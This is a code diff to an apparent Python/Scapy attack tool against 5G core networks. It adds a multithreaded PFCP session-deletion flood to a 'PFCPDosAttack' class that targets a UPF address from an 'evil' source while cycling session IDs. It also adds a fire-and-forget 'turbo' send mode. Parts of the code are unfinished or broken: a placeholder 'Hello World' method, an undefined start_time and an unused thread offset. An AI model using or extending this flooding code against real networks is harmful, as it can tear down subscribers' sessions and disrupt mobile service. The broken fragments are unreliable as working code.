@@ -1,4 +1,4 @@
-from scapy.all import send, IP, UDP, conf
+from scapy.all import send, sr1, IP, UDP, conf
 from scapy.contrib.pfcp import *
 import time, random, ipaddress, threading
 
@@ -250,7 +250,7 @@ class Ez_PFCP:
         if self.verbose:
             print(f"[EZ-PFCP] PFCP Session Establishment packet sent")
 
-    def Send_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
+    def Send_PFCP_session_deletion_req(self, seid=None, src_addr=None, dest_addr=None, src_port=None, dest_port=None, turbo=False):
         seid = seid or self.seid
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
@@ -273,13 +273,23 @@ class Ez_PFCP:
             print("[EZ-PFCP] Error: No destination port provided. Expected a valid port number (e.g., 8805).")
             return
 
-        send(self.Build_PFCP_session_deletion_req(
-            seid=seid,
-            src_addr=src_addr,
-            dest_addr=dest_addr,
-            src_port=src_port,
-            dest_port=dest_port
-        ))
+        req = self.Build_PFCP_session_deletion_req(
+                seid=seid,
+                src_addr=src_addr,
+                dest_addr=dest_addr,
+                src_port=src_port,
+                dest_port=dest_port
+            )
+        if turbo:
+            send(req)
+            return
+        
+        res = sr1(req)
+        if res:
+            res.show()
+        else: 
+            print("[EZ-PFCP] No response received for PFCP session deletion request")
+        
 
         
         
@@ -412,7 +422,11 @@ class PFCPDosAttack:
                 print(f"[DoS] Progress: {percent}% ({i+1}/{count})")
         print(f"[DoS] Prepared the PFCP association setup packet")
         print(f"[DoS] Prepared {count} PFCP session establishment packets")
-                
+    
+    def prepare_pfcp_session_deletion_flood(self, count):
+        if self.verbose:
+            print(f"[DoS] Preparing {count} PFCP session deletion packets")
+        print("Hello World")
     
     def pfcp_session_establishment_flood_worker(self, count, start_index=0):
         if self.verbose:
@@ -447,6 +461,48 @@ class PFCPDosAttack:
         if self.verbose:
             print(f"[DoS][Worker] Worker finished flooding with {count} requests")
 
+    def pfcp_session_deletion_flood_worker(self, count, start_index=0):
+        if self.verbose:
+            print("[DoS][Worker] Worker starts flooding with {count} requests (offset {start_index})")
+        
+        
+        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port)
+        for i in range(start_index, start_index+count): 
+            try:
+                pfcp_obj.Send_PFCP_session_deletion_req(seid=i)
+                
+            except Exception as e:
+                print(f"[DoS][Worker] Error sending PFCP session deletion request: {e}") 
+                
+    
+    def Start_pfcp_session_deletion_flood(self, reqNbr=100, num_threads=1):
+        if self.prepare:
+            self.prepare_pfcp_session_deletion_flood(reqNbr)
+            
+        if self.verbose:
+            print(f"[DoS] Starting PFCP session deletion flood with {reqNbr} requests and {num_threads} threads")
+
+        threads= []
+        per_thread = reqNbr // num_threads
+        remaining = reqNbr % num_threads
+        pfcp_obj = Ez_PFCP(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
+        thread_offset = 0
+        for i in range(num_threads):
+            count = per_thread + (1 if i < remaining else 0)
+            t = threading.Thread(target=self.pfcp_session_deletion_flood_worker, args=(count,))
+            t.start()
+            threads.append(t)
+            thread_offset += count
+        
+        for t in threads:
+            t.join()
+        if self.verbose:
+            print(f"[DoS] PFCP session deletion flood completed")
+        end_time = time.time()
+        duration = end_time - start_time
+        pps = reqNbr / duration if duration > 0 else float("inf")
+        print(f"[DoS] Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
+        
     
     def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
         if self.prepare:
@@ -546,6 +602,7 @@ class PFCPDosAttack:
 # Ez_PFCP().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
 # Ez_PFCP().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
 #                                               seid=0xC0FFEE, ue_addr="1.1.1.1")
+
 
 
 ########## UTILISATION PFCPDosAttack
